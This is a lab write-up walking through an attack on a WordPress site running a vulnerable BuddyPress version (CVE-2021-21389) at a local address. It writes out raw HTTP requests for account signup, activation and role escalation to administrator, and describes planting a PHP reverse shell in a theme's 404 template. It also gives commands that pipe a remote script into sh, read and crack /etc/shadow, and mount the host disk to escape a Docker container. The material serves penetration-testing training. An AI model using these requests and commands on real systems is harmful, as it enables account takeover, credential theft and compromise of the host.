# Privilege Escalation via REST API Leading to Docker Container Escape Lab Writeup
## (time required 30 mins - 60 mins)
### A lab by Warren Atkinson


BuddyPress is an open source WordPress plugin to build a community site. In releases of BuddyPress from 5.0.0 before 7.2.1 it's possible for a non-privileged, regular user to obtain administrator rights by exploiting an issue in the REST API members endpoint. The vulnerability has been fixed in BuddyPress 7.2.1. Existing installations of the plugin should be updated to this version to mitigate the issue.


https://developer.buddypress.org/bp-rest-api/

The buddy press api has everything you need to know about how to interact with the api.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21389

Subjects covered
API manipulation
Creating a user account with auth bypass
Cookie manipulation leading to Privilege Escalation
Getting a shell from wordpress
Enumeration to find Linux elevation vector
Docker container escape




### Finding the entry point.
The WPScan CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites. The WPScan CLI tool uses our database of 38,274 WordPress vulnerabilities.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/1.png?raw=true)

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/2.png?raw=true)

But it can't find this vulnerability, this highlights why tools shouldnt be relied upon for detection, it does give us an interesting hint that the plugin buddypress is out of date.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/3.png?raw=true)

A quick google for buddypress + vulnerabilities revealed the following cve. https://www.cvedetails.com/cve/CVE-2021-21389/

BuddyPress is an open source WordPress plugin to build a community site. In releases of BuddyPress from 5.0.0 before 7.2.1 it's possible for a non-privileged, regular user to obtain administrator rights by exploiting an issue in the REST API members endpoint. The vulnerability has been fixed in BuddyPress 7.2.1. Existing installations of the plugin should be updated to this version to mitigate the issue.

The target is running version 7, it should be vulnerable.
 
Lets try to find a poc to  help us walk through this vulnerability.

The only poc I could find out in the wild was a python script that automates the request flow. I managed to reverse engineer the steps into how a user would exploit the api using burp suite. This github repo by HoangKien1020 the repo only has 17 stars. https://github.com/HoangKien1020/CVE-2021-21389 




### Creating a user account with auth bypass
/buddypress/v1/signup is the endpoint to create a user account

We will craft a request to create an account.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/4.png?raw=true)

Let's craft the request.


```
POST /wp-json/buddypress/v1/signup HTTP/1.1
HOST: 192.168.0.16:7006
Content-Type: application/json; charset=UTF-8
Content-Length: 107

{
"user_login": "test7",
"user_email": "test7@test.com",
"user_name": "test7",
"password": "test7"
}
```

 
Response
```
Response
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 20:45:36 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
X-Robots-Tag: noindex
Link: <http://192.168.0.16:7006/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: POST
Content-Length: 266
Content-Type: application/json; charset=UTF-8



[{"id":7,"user_login":"test2","registered":"2023-01-11T20:45:36","user_name":"test2","activation_key":"tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L","user_email":"test2@test.com","date_sent":"2023-01-11T20:45:36","count_sent":1,"meta":{"field_1":"test2","profile_field_ids":1}}]
```

Excellent we  have created an account with the creds
```
"user_login": "test2", 
"user_email": "test2@test.com", 
"user_name": "test2", 
"password": "test2"
```




Please note, this account has not been activated* by email yet we have received an activation_key via the response from the previous request… Interesting.
 

Let's check what other endpoints are of interest?
 
On the buddypress rest api docs, if you scroll down only 2 divs you can find an activation endpoint. Who wrote this code?
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/5.png?raw=true)
 
 
 
 
 
 
 
 

Lets craft a request for this endpoint to try and activate the account we just made.
Request
``` 
PUT /wp-json/buddypress/v1/signup/activate/tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L HTTP/1.1
HOST: 192.168.0.16:7006
Content-Length: 0
Content-Type: application/json; charset=UTF-8

{
}
```
Response
``` 
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 20:57:16 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
X-Robots-Tag: noindex
Link: <http://192.168.0.16:7006/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Content-Length: 266
Content-Type: application/json; charset=UTF-8


[{"id":7,"user_login":"test2","registered":"2023-01-11T20:45:36","user_name":"test2","activation_key":"tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L","user_email":"test2@test.com","date_sent":"2023-01-11T20:45:36","count_sent":1,"meta":{"field_1":"test2","profile_field_ids":1}}]
```
 
 
 
 
 
 

Let's try to login… Success. But we are not admin. This far we have only tested if the endpoints will allow account creation, and the fact the verification step was so easy to bypass that it is worth investigating further what exists?
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/6.png?raw=true)
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/7.png?raw=true)
 
 
 
 
### Finding the nonce.

Let's talk about what buddypress tries to achieve.

“BuddyPress helps you build any kind of community website using WordPress, with member profiles, activity streams, user groups, messaging, and more.”

We are going to exploit the groups function to try and obtain the WP-Nonce




Let's check the groups for the nonce?
 
 
Lets create a group

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/8.png?raw=true)

Use Burp Suite proxy and pause the requests and step over, follow the workflow to create a group, keep your eyes peeled for the X-WP-Nonce and Cookie.

In the first section (Enter Group Name & Description)we find the cookie.
``` 
Cookie: wp-settings-time-6=1673475146; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_1be8abdff50a11d493930c4498bcea44=test10%7C1673677770%7CSTA8r35d5LxrbTT1esDeqmnBnzlfEVSPNjacQkAg34s%7C13210b72a8690802f0be7455f6e7ff088c7d8bb305a21dbf389b64fcf6a111aa; wp-settings-time-11=1673504970; bp_new_group_id=29; bp_completed_create_steps=WyJncm91cC1kZXRhaWxzIl0%3D
```
 

Quickly step over the rest of the steps, you will be presented with the group landing page for the group you have just created. Notice in the header “Group Administrators” interesting?

Lets click manage
>> members

We are presented a page where we can complete admin like functions such as edit ban and remove users from the group.

Lets try the Ban function and inspect the request.
```  
X-WP-Nonce: 8af0f38b91
``` 
 
Nice, we have found the nonce.

If we now craft this request and send it to the vulnerable endpoint /wp-json/buddypress/v1/members/me we should be able to elevate our privs.
``` 
POST /wp-json/buddypress/v1/members/me HTTP/1.1

Host: 192.168.0.16:7006
Accept: application/json, */*;q=0.1
X-WP-Nonce: 8af0f38b91
Content-Type: application/json; charset=UTF-8
Cookie: wp-settings-time-6=1673475146; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_1be8abdff50a11d493930c4498bcea44=test10%7C1673677770%7CSTA8r35d5LxrbTT1esDeqmnBnzlfEVSPNjacQkAg34s%7C13210b72a8690802f0be7455f6e7ff088c7d8bb305a21dbf389b64fcf6a111aa; wp-settings-time-11=1673504970; bp_new_group_id=29; bp_completed_create_steps=WyJncm91cC1kZXRhaWxzIl0%3D
Content-Length: 45



{
        "roles": "administrator"
    }
```

The first response will not give the correct return response shown below, send this request again to yield similar results to the response below.


```
HTTP/1.1 200 OK
Date: Thu, 12 Jan 2023 06:37:42 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
X-Robots-Tag: noindex
Link: <http://192.168.0.16:7006/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-WP-Nonce: 8af0f38b91
Allow: GET, POST, PUT, PATCH
Content-Length: 2138
Content-Type: application/json; charset=UTF-8



{"id":11,"name":"test10","user_login":"test10","link":"http:\/\/192.168.0.16:7006\/members\/test10\/","member_types":[],"roles":["administrator"],"capabilities":["switch_themes","edit_themes","activate_plugins","edit_plugins","edit_users","edit_files","manage_options","moderate_comments","manage_categories","manage_links","upload_files","import","unfiltered_html","edit_posts","edit_others_posts","edit_published_posts","publish_posts","edit_pages","read","level_10","level_9","level_8","level_7","level_6","level_5","level_4","level_3","level_2","level_1","level_0","edit_others_pages","edit_published_pages","publish_pages","delete_pages","delete_others_pages","delete_published_pages","delete_posts","delete_others_posts","delete_published_posts","delete_private_posts","edit_private_posts","read_private_posts","delete_private_pages","edit_private_pages","read_private_pages","delete_users","create_users","unfiltered_upload","edit_dashboard","update_plugins","delete_plugins","install_plugins","update_themes","install_themes","update_core","list_users","remove_users","promote_users","edit_theme_options","delete_themes","export","SPF Manage Options","SPF Manage Forums","SPF Manage User Groups","SPF Manage Permissions","SPF Manage Components","SPF Manage Admins","SPF Manage Users","SPF Manage Profiles","SPF Manage Toolbox","SPF Manage Plugins","SPF Manage Themes","SPF Manage Integration","bp_moderate","administrator"],"extra_capabilities":["administrator"],"registered_date":"2023-01-12T06:23:33","xprofile":{"groups":{"1":{"name":"Base","fields":{"1":{"name":"Name","value":{"raw":"test10","unserialized":["test10"],"rendered":"<p>test10<\/p>\n"}}}}}},"friendship_status":false,"friendship_status_slug":"","mention_name":"test10","avatar_urls":{"full":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=150&#038;r=g&#038;d=mm","thumb":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=50&#038;r=g&#038;d=mm"},"_links":{"self":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members\/11"}],"collection":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members"}]}}
```
 
Nice, see roles":["administrator"] let's check if we have elevated?

Visit the http://192.168.0.16:7006/wp-admin/users.php to check the Role of the account we created

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/9.png?raw=true)


Congrats.

Now lets escape the Wordpress install, this should be easy now we are admin, we have the functionality to upload and run scripts in various ways in wordpress, lets browse to the theme editor.
http://192.168.0.16:7006/wp-admin/theme-editor.php
 
We can insert a php reverse shell inside of a page template, when this page is visited the reverse shell connects to a netcat listener we will set up.


Let's choose the 404 page.
http://192.168.0.16:7006/wp-admin/theme-editor.php?file=404.php&theme=Goldly
Between the <?php <<code>> ?> tags insert the popular php reverse shell by pentestmonkey https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Change the ip and port number inside the script to the ip of the attacking machine; use terminal command ifconfig to find the ip and an unused port.
 
On the attacking machine start up a netcat listener using the command nc -lvp <<port>>
 
To visit this page browse to url
http://192.168.0.16:7006//wordpress/wp-content/themes/Goldly/404.php
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/10.png?raw=true)
 
Reverse shell connects to the attacker, now we run the whoami command to get the current user. www-data
 
 
 
 

### Linux priv esc


First let's  get a list of users by reading the contents of the passwd file


```
cat /etc/passwd
```

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/11.png?raw=true)

root will be our target as it has the highest privs.





Let's start by running LinPEAS, LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix hosts.


Start by using curl to pull and run the latest compiled branch of LinPEAS
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS will format the results in the following color code based on the % chance of success of a vector.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/12.png?raw=true)

Interesting results

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/13.png?raw=true)


Shadow files shouldn’t be accessible to low privileged users, this file contains a list of all user accounts and password hashes

Let's take a close look at the entry for root.
```
root:$6$.ctyXo1jtgIm.fCk$PgUb7kyoLElbx5IBNzw9KKDLnxlanLv15LY0pELWDvWR4mstD4kUnzBPFTM1D3khueJ5j1gwIFBxzY9kPPJF80:19369:0:99999:7:::
```

Understanding the shadow file format.
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/14.png?raw=true)
 
```
All fields are separated by a colon (:)
Field 1 is username
Field 2 first 3 chars are the hashing algo followed by the hash
$1$ is MD5
$2a$ is Blowfish
$2y$ is Blowfish
$5$ is SHA-256
$6$ is SHA-512
Field 3 Days since last password change
Field 4 minimum days required between password changes
Field 5 maximum number of days the password is valid
Field 6 The number of days before password is to expire that user is warned that his/her password must be changed
```
We can save the shadow file in the working directory and use john the ripper to compare the target hash vs a wordlist that the tool will hash with the SHA-512 algo. If a match is found it will present us with the unhashed value. https://github.com/openwall/john
```
john --wordlist=/usr/share/wordlists/john.lst --rules shadow
```

We are using the provided john.lst wordlist provided with kali linux. 



Result.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/15.png?raw=true)

Luckily a password in the list matched the hash we found previously.
The root password is security.

Let's elevate the shell to root.
Run the su command with target user root
“su” is short for substitute or switch user
```
su root
```

whoami to check current user

 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/16.png?raw=true)


 
 
## What is outside of the box?
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/17.png?raw=true)
 
Remember when we ran LinPEAS in the previous chapter?

It also runs some instance detection to detect if we are running inside of a container.

![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/18.png?raw=true)

Looks like we are running inside a docker container, i wonder what if anything is outside of the box?

Let's check if the host disk is mounted.
```
fdisk -l
```
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/19.png?raw=true)




Result, looks like the host filesystem is indeed mounted. 
We should be able to mount this drive and access the filesystem.

First lets create a new directory for the filesystem
```
mkdir /mnt/xvda1
```

Lets move into the mounted filesystem and have a look at the passwd file to get an idea of who we are.
 
![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/20.png?raw=true)


Let's check the permissions we have on the host shadow file
```
ls -l /mnt/xvda1/etc/shadow
```

We have read and write perms
```
-rw-r----- 1 root shadow 840 Jan 13 20:51 /mnt/xvda1/etc/shadow
```

Bonus points if you can find the flag!

